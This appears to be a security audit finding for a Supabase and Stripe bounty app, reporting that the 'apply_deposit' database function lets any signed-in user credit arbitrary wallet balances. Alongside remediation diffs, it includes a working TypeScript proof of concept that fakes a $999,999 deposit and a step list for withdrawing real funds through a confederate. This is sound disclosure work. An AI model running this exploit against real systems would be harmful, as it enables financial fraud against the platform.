# Unauthenticated Stripe Verification in apply_deposit RPC Allows Unlimited Wallet Balance Inflation

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-08-25 00:29:29 UTC
**Target:** /workspace/Bounty-production
**Endpoint:** /rpc/apply_deposit
**Method:** POST
**CWE:** CWE-862
**CVSS:** 6.5
**Fix Effort:** Trivial

## Description

The `apply_deposit` PostgreSQL function is granted `EXECUTE` to the `authenticated` role, allowing any authenticated user to call it directly via the Supabase JS client and credit any arbitrary dollar amount to their own (or another user's) wallet without making any real Stripe payment. The function accepts a caller-controlled `p_amount` and a `p_payment_intent_id` string that is never verified against Stripe's API, making it trivially exploitable for unlimited money creation.

## Evidence

```sql
-- From supabase/migrations/20260310_apply_deposit.sql
GRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO authenticated;

-- Function body: no auth.uid() check, no Stripe API call, no status verification
INSERT INTO wallet_transactions(
  user_id, type, amount, description, status, stripe_payment_intent_id, metadata, created_at, updated_at
) VALUES (
  p_user_id, 'deposit', p_amount, 'Wallet deposit via Stripe', 'completed', p_payment_intent_id, p_metadata, NOW(), NOW()
) ON CONFLICT (stripe_payment_intent_id) WHERE (stripe_payment_intent_id IS NOT NULL) DO NOTHING
RETURNING id INTO v_tx_id;

-- If new row: update balance with whatever p_amount was supplied
UPDATE profiles SET balance = COALESCE(balance, 0) + p_amount, updated_at = NOW()
WHERE id = p_user_id;
```

The ON CONFLICT guard only prevents duplicate inserts for the same `stripe_payment_intent_id` — it does not validate the amount or verify the payment intent's status on Stripe.

## Impact

Any authenticated user can credit their wallet with an arbitrary dollar amount (e.g., $999,999) without making any actual payment. They can also supply any other user's UUID as `p_user_id` to credit a victim's balance. This breaks the financial integrity of the entire platform: attackers can withdraw real funds (via bounty completion, Stripe Connect payouts, etc.) that were never deposited, resulting in direct financial loss for the platform operator. The attack is silent — there is no Stripe charge, webhook, or admin alert triggered.

## Technical Analysis

The `apply_deposit` function defined in `supabase/migrations/20260310_apply_deposit.sql` performs two operations atomically:

1. Inserts a `wallet_transactions` row with type=`deposit`, status=`completed`, and the caller-supplied `p_amount`.
2. Updates `profiles.balance` by adding `p_amount`.

The ON CONFLICT DO NOTHING clause on `stripe_payment_intent_id` is the idempotency guard — the first call with a given `p_payment_intent_id` string wins, and subsequent calls are no-ops.

**Root cause:** The function is declared `SECURITY DEFINER` (executes as the function owner, bypassing RLS) and is granted `EXECUTE` to the `authenticated` role. Inside the function there is no call to Stripe to verify the payment intent's actual charged amount, no check that the intent has status `succeeded`, and no validation that `p_user_id = auth.uid()`. Any authenticated user can call it directly from the Supabase JS client:

```typescript
const { data } = await supabase.rpc('apply_deposit', {
  p_user_id: targetUserId,
  p_amount: 999999,
  p_payment_intent_id: `pi_fake_${Date.now()}`,
  p_metadata: {}
});
```

The `p_payment_intent_id` only needs to be a unique string — it is never validated against the Stripe API. Because the Edge Functions (wallet, payments, webhooks) always use the service role, they cannot be distinguished from a direct client call inside the RPC. The only signal the function uses to decide whether to apply a credit is whether that `stripe_payment_intent_id` string already exists in `wallet_transactions`.

## Proof of Concept

1. Sign in to the application to obtain a valid Supabase JWT for any user account.
2. Note the authenticated user's `userId` (UUID).
3. Using the Supabase JS client (or any HTTP client), call the `apply_deposit` RPC with a fabricated `p_payment_intent_id` (any unique string), a large `p_amount`, and `p_user_id` set to the attacker's own UUID.
4. Observe that the wallet balance is increased by the specified amount immediately.
5. Repeat with a different unique `p_payment_intent_id` to accumulate unlimited balance.
6. Use the inflated balance to post/fund high-value bounties, have a confederate hunter "complete" them, and withdraw real platform funds via Stripe Connect payout.

```typescript
import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.EXPO_PUBLIC_SUPABASE_URL!;
const SUPABASE_ANON_KEY = process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY!;

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Step 1: Authenticate as an attacker
const { data: session, error: loginErr } = await supabase.auth.signInWithPassword({
  email: 'attacker@example.com',
  password: 'password123',
});
if (loginErr || !session?.user) throw new Error('Login failed');

const userId = session.user.id;
console.log('[*] Authenticated as:', userId);

// Step 2: Check current balance
const { data: before } = await supabase
  .from('profiles')
  .select('balance')
  .eq('id', userId)
  .single();
console.log('[*] Balance before:', before?.balance);

// Step 3: Credit $999,999 with a fabricated payment intent ID
const fakeIntentId = `pi_fake_${Date.now()}_${Math.random().toString(36).slice(2)}`;
const { data: rpcResult, error: rpcErr } = await supabase.rpc('apply_deposit', {
  p_user_id: userId,
  p_amount: 999999,
  p_payment_intent_id: fakeIntentId,
  p_metadata: {},
});

if (rpcErr) {
  console.error('[!] RPC error:', rpcErr);
} else {
  console.log('[*] apply_deposit result:', rpcResult);
}

// Step 4: Confirm inflated balance
const { data: after } = await supabase
  .from('profiles')
  .select('balance')
  .eq('id', userId)
  .single();
console.log('[*] Balance after:', after?.balance);
// Expected: balance increased by $999,999 with no real payment made
```

## Code Analysis

**Location 1:** `supabase/migrations/20260310_apply_deposit.sql` (lines 45-46)
  Revoke authenticated EXECUTE grant — primary fix
  ```
  GRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO authenticated;
  GRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO service_role;
  ```

  **Suggested Fix:**
```diff
- GRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO authenticated;
- GRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO service_role;
+ -- Direct authenticated-user access removed: apply_deposit is backend-only.
+ -- All legitimate callers use service_role (Edge Functions, webhooks).
+ GRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO service_role;
```

**Location 2:** `supabase/migrations/20260310_apply_deposit.sql` (lines 13-16)
  Add caller-identity guard inside the function body
  ```
  DECLARE
    v_tx_id UUID;
  BEGIN
    -- Try to insert the wallet transaction.
  ```

  **Suggested Fix:**
```diff
- DECLARE
-   v_tx_id UUID;
- BEGIN
-   -- Try to insert the wallet transaction.
+ DECLARE
+   v_tx_id UUID;
+ BEGIN
+   -- Defense-in-depth: authenticated callers may only deposit to themselves.
+   IF auth.role() = 'authenticated' AND auth.uid() <> p_user_id THEN
+     RAISE EXCEPTION 'apply_deposit: caller may not deposit to a different user'
+       USING ERRCODE = '42501';
+   END IF;
+   -- Try to insert the wallet transaction.
```

## Remediation

1. **Revoke the `authenticated` grant on `apply_deposit`** immediately: `REVOKE EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) FROM authenticated;`. The function should only be callable by `service_role` (backend Edge Functions and webhooks) — never directly by client-side authenticated users.

2. **Add a caller-identity guard inside the function**: At the start of the function body, add `IF auth.role() = 'authenticated' AND auth.uid() <> p_user_id THEN RAISE EXCEPTION 'Caller may not deposit to another user'; END IF;`. This is a defense-in-depth measure; the grant revocation above is the primary fix.

3. **Verify the payment intent server-side**: The `/wallet/deposit` Edge Function should call `stripe.paymentIntents.retrieve(paymentIntentId)` and assert `pi.status === 'succeeded'` and `pi.metadata.user_id === userId` before calling `apply_deposit`. It should use `pi.amount / 100` as the canonical amount instead of the client-supplied value. This eliminates the amount-manipulation attack that remains even if direct RPC access is removed (see companion finding).

4. **Add a `pi_` prefix length/format check** on `p_payment_intent_id` inside the RPC as a secondary guard against fabricated strings, though the grant revocation is the definitive fix.

## Assumptions

Assumes the attacker has any valid authenticated session (free self-registration is available). No admin privileges, no special account state required.
